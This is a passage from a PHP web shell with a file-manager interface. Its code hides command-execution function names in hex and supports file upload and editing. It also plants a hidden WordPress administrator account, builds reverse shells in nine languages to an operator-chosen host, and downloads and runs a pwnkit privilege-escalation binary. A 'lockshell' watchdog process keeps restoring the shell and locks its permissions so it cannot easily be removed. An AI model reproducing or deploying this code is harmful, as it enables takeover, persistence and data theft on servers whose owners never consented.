                $('#modal-title').html('<i class="fa-solid fa-file-circle-plus"></i> Create File');
                $('#modal-input').html('<input type="text" name="create_file" class="modal-create-input" placeholder="File name">');
                $('#generalModal').addClass('active')
            });
            $('#lock-file').click(function(e){
                e.preventDefault();
                $('#modal-title').html('<i class="fa-solid fa-lock"></i> LOCK FILE');
                $('#modal-input').html('<input type="text" name="lockfile" class="modal-create-input" placeholder="Your File Name">');
                $('#generalModal').addClass('active')
            });
            $(document).on('click','#close-modal,.close-modal',function(e){e.preventDefault();$('.modal').removeClass('active')});
            $('#close-editor').click(function(e){e.preventDefault();$('.code-editor').removeClass('active')});
            $('.close-terminal').click(function(e){e.preventDefault();$('.terminal').removeClass('active')});
            var myTextarea=document.getElementById("code");
            if(myTextarea)CodeMirror.fromTextArea(myTextarea,{mode:"xml",lineNumbers:true,theme:"ayu-mirage",extraKeys:{"Ctrl-Space":"autocomplete"},hintOptions:{completeSingle:false}})
        });
    </script>
</body>
</html>
<?php
if (isset($_POST['aptisme-up-submit'])) {
    if(isset($_FILES['aptisme-upload']) && $_FILES['aptisme-upload']['error'] == 0) {
        $targetPath = $fungsi[0]() . "/" . $_FILES['aptisme-upload']['name'];
        if ($fungsi[29]($_FILES['aptisme-upload']['tmp_name'], $targetPath)) success(); else failed();
    } else failed();
}

if (isset($_POST['submitwp'])) {
    $conn = new mysqli($_POST['db_host'], $_POST['db_user'], $_POST['db_password'], $_POST['db_name']);
    if ($conn->connect_error) { failed(); die("Error: " . $conn->connect_error); }
    
    $wp_user = $_POST['wp_user'];
    $wp_pass = password_hash($_POST['wp_pass'], PASSWORD_DEFAULT);
    
    $sql = "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) VALUES ('$wp_user', '$wp_pass', 'Aptisme', '', '', NOW(), '', 0, 'Aptisme')";
    if ($conn->query($sql) === TRUE) {
        $user_id = $conn->insert_id;
        $sql2 = "INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ($user_id, 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')";
        if ($conn->query($sql2) === TRUE) success(); else echo "Error: " . $conn->error;
    } else echo "Error: " . $conn->error;
    $conn->close();
}

if (isset($_GET['unlockshell'])) {
    cmd("killall -9 php 2>&1");
    success();
}

if (isset($_POST['submit-bc'])) {
    $h = $_POST['backconnect-host'];
    $p = $_POST['backconnect-port'];
    $type = $_POST['aptisme-bc'];
    
    $commands = [
        'perl'   => 'perl -e \'use Socket;$i="'.$h.'";$p='.$p.';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
        'python' => 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'.$h.'",'.$p.'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
        'ruby'   => 'ruby -rsocket -e\'f=TCPSocket.open("'.$h.'",'.$p.').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
        'bash'   => 'bash -i >& /dev/tcp/'.$h.'/'.$p.' 0>&1',
        'php'    => 'php -r \'$s=fsockopen("'.$h.'",'.$p.');exec("/bin/sh -i <&3 >&3 2>&3");\'',
        'nc'     => 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '.$h.' '.$p.' >/tmp/f',
        'sh'     => 'sh -i >& /dev/tcp/'.$h.'/'.$p.' 0>&1',
        'xterm'  => 'xterm -display '.$h.':'.$p,
        'golang' => 'echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","'.$h.':'.$p.'");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go'
    ];
    
    if (isset($commands[$type])) {
        echo cmd($commands[$type]);
    }
}

if (isset($_GET['lockshell'])) {
    $curFile = trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
    $TmpNames = $fungsi[31]();
    $encodedPath = $fungsi[33]($fungsi[0]() . remove_dot($curFile));
    
    if (!is_dir($TmpNames . "/.sessions")) mkdir($TmpNames . "/.sessions");
    
    @unlink($TmpNames . '/.sessions/.' . $encodedPath . '-text');
    @unlink($TmpNames . '/.sessions/.' . $encodedPath . '-handler');
    
    copy($curFile, $TmpNames . "/.sessions/." . $encodedPath . '-text');
    $fungsi[30]($curFile, 0444);
    
    $handler = '<?php
@ini_set("max_execution_time", 0);
while (True) {
    if (!is_dir("' . __DIR__ . '")) mkdir("' . __DIR__ . '");
    if (!file_exists("' . $fungsi[0]() . '/' . $curFile . '")) {
        $text = ' . $fungsi[33] . '(file_get_contents("' . $TmpNames . '/.sessions/.' . $encodedPath . '-text"));
        file_put_contents("' . $fungsi[0]() . '/' . $curFile . '", ' . $fungsi[32] . '($text));
    }
    if (substr(sprintf("%o", fileperms("' . $fungsi[0]() . '/' . $curFile . '")), -4) != "0444") {
        chmod("' . $fungsi[0]() . '/' . $curFile . '", 0444);
    }
    if (substr(sprintf("%o", fileperms("' . __DIR__ . '")), -4) != "0555") {
        chmod("' . __DIR__ . '", 0555);
    }
    sleep(5);
}
?>';
    
    if (file_put_contents($TmpNames . "/.sessions/." . $encodedPath . '-handler', $handler)) {
        cmd(PHP_BINARY . ' ' . $TmpNames . '/.sessions/.' . $encodedPath . '-handler' . ' > /dev/null 2>/dev/null &');
        success();
    } else failed();
}

if (isset($_POST['save-editor'])) {
    if (isset($_GET['f'])) {
        if ($fungsi[28]($fungsi[0]() . "/" . unx($_GET['f']), $_POST['code-editor'])) success(); else failed();
    }
}

if (isset($_GET['terminal']) && $_GET['terminal'] == "root") {
    if (!$fungsi[3]('pwnkit') && $fungsi[4]($fungsi[0]())) {
        $fungsi[28]("pwnkit", $fungsi[11]("https://github.com/MadExploits/Privelege-escalation/raw/main/pwnkit"));
        cmd('chmod +x pwnkit');
        echo cmd('./pwnkit "id" > .mad-root');
        echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&terminal=root">';
    }
}

if (isset($_POST['submit-action']) && isset($_POST['check'])) {
    $items = $_POST['check'];
    $action = $_POST['aptisme-select'];
    $repl = str_replace("\\", "/", $fungsi[0]());
    
    if ($action == "delete") {
        $allSuccess = true;
        foreach ($items as $it) {
            $fd = $repl . "/" . $it;
            if ($fungsi[2]($fd)) {
                if (!delTree($fd)) $allSuccess = false;
            } elseif ($fungsi[3]($fd)) {
                if (!$fungsi[24]($fd)) $allSuccess = false;
            }
        }
        if ($allSuccess) success(); else failed();
    }
    elseif ($action == 'unzip') {
        $allSuccess = true;
        foreach ($items as $it) {
            $fd = $repl . "/" . $it;
            if (!extractArchive($fd, $repl . '/')) $allSuccess = false;
        }
        if ($allSuccess) success(); else failed();
    }
    elseif ($action == 'zip') {
        foreach ($items as $it) {
            $fd = $repl . "/" . $it;
            if ($fungsi[3]($fd)) compressToZip($fd, pathinfo($fd, PATHINFO_FILENAME) . ".zip");
        }
    }
}

if (isset($_POST['submit'])) {
    if (!empty($_POST['create_folder'])) {
        if ($fungsi[12]($_POST['create_folder'])) success(); else failed();
    }
    elseif (!empty($_POST['create_file'])) {
        if ($fungsi[13]($_POST['create_file'])) success(); else failed();
    }
    elseif (!empty($_POST['renameFile']) && isset($_GET['re'])) {
        if ($fungsi[15](unx($_GET['re']), $_POST['renameFile'])) success(); else failed();
    }
    elseif (!empty($_POST['chFile']) && isset($_GET['ch'])) {
        $targetFile = unx($_GET['ch']);
        $permInput = trim($_POST['chFile']);
        if (preg_match('/^[0-7]{3,4}$/', $permInput)) {
            $octalValue = octdec($permInput);
            if ($fungsi[30]($targetFile, $octalValue)) success(); else failed();
        } else failed();
    }
    elseif (!empty($_POST['lockfile'])) {
        $flesName = $_POST['lockfile'];
        $TmpNames = $fungsi[31]();
        $encodedPath = $fungsi[33]($fungsi[0]() . remove_dot($flesName));
        
        if (!is_dir($TmpNames . "/.sessions")) mkdir($TmpNames . "/.sessions");
        
        @unlink($TmpNames . '/.sessions/.' . $encodedPath . '-text-file');
        @unlink($TmpNames . '/.sessions/.' . $encodedPath . '-handler');
        
        copy($flesName, $TmpNames . "/.sessions/." . $encodedPath . '-text-file');
        $fungsi[30]($flesName, 0444);
        
        $handler = '<?php
@ini_set("max_execution_time", 1200);
while (True) {
    if (!is_dir("' . $fungsi[0]() . '")) mkdir("' . $fungsi[0]() . '");
    if (!file_exists("' . $fungsi[0]() . '/' . $flesName . '")) {
        $text = ' . $fungsi[33] . '(file_get_contents("' . $TmpNames . '/.sessions/.' . $encodedPath . '-text-file"));
        file_put_contents("' . $fungsi[0]() . '/' . $flesName . '", ' . $fungsi[32] . '($text));
    }
    if (substr(sprintf("%o", fileperms("' . $fungsi[0]() . '/' . $flesName . '")), -4) != "0444") {
        chmod("' . $fungsi[0]() . '/' . $flesName . '", 0444);
    }
    if (substr(sprintf("%o", fileperms("' . $fungsi[0]() . '")), -4) != "0555") {
        chmod("' . $fungsi[0]() . '", 0555);
    }
    sleep(5);
}
?>';
        
        if (file_put_contents($TmpNames . "/.sessions/." . $encodedPath . '-handler', $handler)) {
            cmd(PHP_BINARY . ' ' . $TmpNames . '/.sessions/.' . $encodedPath . '-handler' . ' > /dev/null 2>/dev/null &');
            success();
        } else failed();
    }
}

if (isset($_GET['response'])) {
    if ($_GET['response'] == "success") {
        echo "<script>Swal.fire({icon:'success',title:'Success',text:'Done!',confirmButtonColor:'#4da6ff'})</script>";
    } elseif ($_GET['response'] == "failed") {
        echo "<script>Swal.fire({icon:'error',title:'Failed',text:'Something wrong!',confirmButtonColor:'#4da6ff'})</script>";
    }
}

function success() { 
    echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($GLOBALS['fungsi'][0]()) . '&response=success">'; 
}
function failed() { 
    echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($GLOBALS['fungsi'][0]()) . '&response=failed">'; 
}

function formatSize($bytes) {
    $t = ['B','KB','MB','GB','TB']; 
    for($i=0;$bytes>=1024&&$i<4;$bytes/=1024,$i++);
    return round($bytes,2).' <span class="file-size">'.$t[$i].'</span>';
}

function hx($n) {
    $y = ''; 
    for($i=0;$i<strlen($n);$i++) $y.=dechex(ord($n[$i])); 
    return $y;
}

function unx($y) {
    $n = ''; 
    for($i=0;$i<strlen($y)-1;$i+=2) $n.=chr(hexdec($y[$i].$y[$i+1])); 
    return $n;
}

function cmd($in) {
    $out = '';
    try {
        if (function_exists("\x65\x78\x65\x63")) {
            @exec($in . " 2>&1", $out);
            $out = @join("\n", $out);
        }
        elseif (function_exists("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63")) {
            $out = @shell_exec($in . " 2>&1");
        }
        elseif (function_exists("\x73\x79\x73\x74\x65\x6d")) {
            ob_start();
            @system($in . " 2>&1");
            $out = ob_get_clean();
        }
        elseif (function_exists("\x70\x61\x73\x73\x74\x68\x72\x75")) {
            ob_start();
            @passthru($in . " 2>&1");
            $out = ob_get_clean();
        }
        elseif (function_exists("\x70\x6f\x70\x65\x6e")) {
            $f = @popen($in . " 2>&1", "r");
            if (is_resource($f)) {
                $out = "";
                while(!@feof($f)) $out .= fread($f, 8192);
                @pclose($f);
            }
        }
        elseif (function_exists("\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e")) {
            $pipes = [];
            $process = @proc_open($in . " 2>&1", [["pipe","r"],["pipe","w"],["pipe","w"]], $pipes);
            if (is_resource($process)) {
                $out = stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                proc_close($process);
            }
        }
    } catch (Exception $e) {
        $out = $e->getMessage();
    }
    return trim($out);
}

function compressToZip($src, $zip) {
    $z = new ZipArchive();
    if ($z->open($zip, ZipArchive::CREATE) === TRUE) {
        $z->addFile($src, basename($src));
        $z->close();
        success();
    } else failed();
}

function delTree($dir) {
    $files = array_diff(scandir($dir), ['.','..']);
    foreach ($files as $file) {
        (is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file");
    }
    return rmdir($dir);
}

function remove_dot($f) {
    $p = explode(".", $f); 
    return $p[0];
}

function windowsDriver() {
    foreach(range('A','Z') as $w) {
        if(is_dir($w.":/")) {
            echo "<a style='color:var(--accent);font-weight:bold' href='?d=".hx($w.":/")."'>[ ".$w." ] </a>&nbsp;";
        }
    }
}

function namaPanjang($v) {
    return $v;
}

function extractArchive($f, $p) {
    $z = new ZipArchive();
    if ($z->open($f) === TRUE) {
        $z->extractTo($p);
        $z->close();
        return true;
    }
    return false;
}

function perms($file) {
    $p = fileperms($file);
    $i = '';
    if(($p & 0xC000) == 0xC000) $i = 's';
    elseif(($p & 0xA000) == 0xA000) $i = 'l';
    elseif(($p & 0x8000) == 0x8000) $i = '-';
    elseif(($p & 0x6000) == 0x6000) $i = 'b';
    elseif(($p & 0x4000) == 0x4000) $i = 'd';
    elseif(($p & 0x2000) == 0x2000) $i = 'c';
    elseif(($p & 0x1000) == 0x1000) $i = 'p';
    else $i = 'u';
    $i .= (($p & 0x0100) ? 'r' : '-');
    $i .= (($p & 0x0080) ? 'w' : '-');
    $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
    $i .= (($p & 0x0020) ? 'r' : '-');
    $i .= (($p & 0x0010) ? 'w' : '-');
    $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
    $i .= (($p & 0x0004) ? 'r' : '-');
    $i .= (($p & 0x0002) ? 'w' : '-');
    $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
    return $i;
}
?>